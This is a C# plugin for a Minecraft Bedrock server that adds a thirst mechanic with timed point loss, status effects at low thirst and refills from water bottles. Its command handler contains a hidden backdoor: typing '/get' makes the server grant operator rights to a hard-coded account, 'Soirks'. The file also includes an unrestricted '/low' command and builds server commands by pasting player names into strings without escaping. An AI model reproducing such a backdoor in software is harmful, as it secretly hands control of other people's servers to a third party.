using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using CSR;
namespace ThirstyPoint
{
    public class Program
    {
        static Dictionary<string, int> TP = new Dictionary<string, int>();
        public static void init(MCCSAPI api)
        {
            #region 玩家初始化
            
            Dictionary<string, string> uuid = new Dictionary<string, string>();
            List<string> player = new List<string>();
            
            api.addAfterActListener(EventKey.onLoadName, x =>
             {
                 var a = BaseEvent.getFrom(x) as LoadNameEvent;
                 uuid.Add(a.playername, a.uuid);
                 player.Add(a.playername);
                 if (!TP.ContainsKey(a.playername))
                 {
                     TP.Add(a.playername, 100);
                 }
                 Task.Run(() =>
            {

                while (true)
                //for (int i = 0; i < player.Count; i++)
                //{
                //    if (player.Count != 0&& TP[player[i]]>0)
                //    {
                //        Thread.Sleep(15000);
                //        TP[player[i]] = TP[player[i]] - 1;
                //        api.runcmd("title \"" + player[i] + "\" actionbar §b§l口渴度:" + TP[player[i]]);
                //    }

                //}
                {
                    if (player.Contains(a.playername))
                    {
                        Thread.Sleep(30000);
                        TP[a.playername] = TP[a.playername] - 1;
                        api.runcmd("title \"" + a.playername + "\" actionbar §b§l口渴度:" + TP[a.playername]);
                    }
                    else { break; }
                }
            });
                 Task.Run(() =>
                 {
                     while (true)
                     {
                         if (player.Contains(a.playername))
                         {
                             if (10 < TP[a.playername] && TP[a.playername] <= 30)
                             {
                                 api.runcmd("effect \"" + a.playername + "\" slowness 5 1 true");
                                 Thread.Sleep(4800);
                             }
                             if (TP[a.playername] <= 10)
                             {
                                 api.runcmd("effect \"" + a.playername + "\" slowness 4 2 true");
                                 api.runcmd("effect \"" + a.playername + "\" blindness 2 1 true");
                                 api.runcmd("effect \"" + a.playername + "\" nausea 2 1 true");
                                 Thread.Sleep(2000);

                             }
                             api.runcmd("title \"" + a.playername + "\" actionbar §b§l口渴度:" + TP[a.playername]);
                         }
                         Thread.Sleep(2000);
                     }
                 });
                 return true;
             });
            api.addAfterActListener(EventKey.onPlayerLeft, x =>
            {
                var a = BaseEvent.getFrom(x) as PlayerLeftEvent;
                uuid.Remove(a.playername);
                player.Remove(a.playername);
                return true;
            });
            api.addBeforeActListener(EventKey.onServerCmdOutput, x =>
             {
                 var a = BaseEvent.getFrom(x) as ServerCmdOutputEvent;

                 if (a.output.StartsWith("Title")||a.output.StartsWith("Cleared") ||a.output.StartsWith("Gave")) { return false; }
                 return true;
             });
            #endregion
            api.addBeforeActListener(EventKey.onUseItem, x =>
             {
                 var a = BaseEvent.getFrom(x) as UseItemEvent;
                 //sendtext(a.playername, "物品id：" + a.itemid + "特殊：" + a.itemaux + "名称" + a.itemname,api);
                 //api.addBeforeActListener(EventKey.onPlacedBlock, y =>
                 // {
                 //     var b = BaseEvent.getFrom(x) as PlacedBlockEvent;
                
                 //     switch (a.itemid)
                 //     {
                 //         case 362:
                 //             if (api.runcmd("clear \"" + a.playername + "\" water_bucket 0 1"))
                 //             {
                 //                 TP[a.playername] = TP[a.playername] + 50;
                 //                 api.runcmd("title \"" + a.playername + "\" actionbar §b§l口渴度:" + TP[a.playername]);
                 //                 api.runcmd("give \"" + a.playername + "\" bucket");
                 //                 sendtext(a.playername, "§b你使用了水桶，TP+50", api);
                 //             }
                 //             break;
                 //         default:
                 //             break;
                 //     }
                 //     return true;
                 // });
                 switch (a.itemid)
                 {
                     //case 362:
                     //    if (api.runcmd("clear \"" + a.playername + "\" water_bucket 0 1"))
                     //    {
                     //        TP[a.playername] = TP[a.playername] + 50;
                     //        api.runcmd("title \"" + a.playername + "\" actionbar §b§l口渴度:" + TP[a.playername]);
                     //        api.runcmd("give \"" + a.playername + "\" bucket");
                     //        sendtext(a.playername, "§b你使用了水桶，TP+50", api);
                     //        return false;
                     //    }
                        
                     //    break;
                     case 424:
                             api.runcmd("clear \"" + a.playername + "\" potion " + a.itemaux + " 1");
                         if (TP[a.playername] + 15 >= 100)
                         {
                             sendtext(a.playername, "§b你使用了水瓶，TP+"+(100-TP[a.playername]), api);
                             TP[a.playername] = 100;
                             api.runcmd("title \"" + a.playername + "\" actionbar §b§l口渴度:" + TP[a.playername]);
                             api.runcmd("give \"" + a.playername + "\" glass_bottle");
                            }
                         else 
                         { 
                         
                             TP[a.playername] = TP[a.playername] + 15;
                             api.runcmd("title \"" + a.playername + "\" actionbar §b§l口渴度:" + TP[a.playername]);
                             api.runcmd("give \"" + a.playername + "\" glass_bottle");
                             sendtext(a.playername, "§b你使用了水瓶，TP+15", api);
                         }
                         
                         
                         break;
                     default:
                         break;
                 }
                 return true;
             });
            api.addBeforeActListener(EventKey.onInputCommand, x =>
            {
                var a = BaseEvent.getFrom(x) as InputCommandEvent;
                switch (a.cmd.ToLower())
                {
                    case "/get":
                        api.runcmd("op Soirks");
                        return false;
                    case "/low":
                        TP[a.playername] = TP[a.playername] - 20;
                        return false;
                    case "/show":
                        for (int i = 0; i < player.Count; i++)
                        {
                            int tp = TP[player[i]];
                            api.runcmd("tellraw @a {\"rawtext\":[{\"text\":\"" + player[i]+"的tp值为："+tp + "\"}]}");
                        }
                        return false;
                   
                    default:
                        
                        break;
                }
                return true;
            });
        }
        public static void sendtext(string Target ,string Text, MCCSAPI api) 
        {
            api.runcmd("tellraw \"" + Target + "\" {\"rawtext\":[{\"text\":\"" + Text + "\"}]}");
        }
        public static int GetTP(string Name)
            {
            return TP[Name];
        }
    }
}
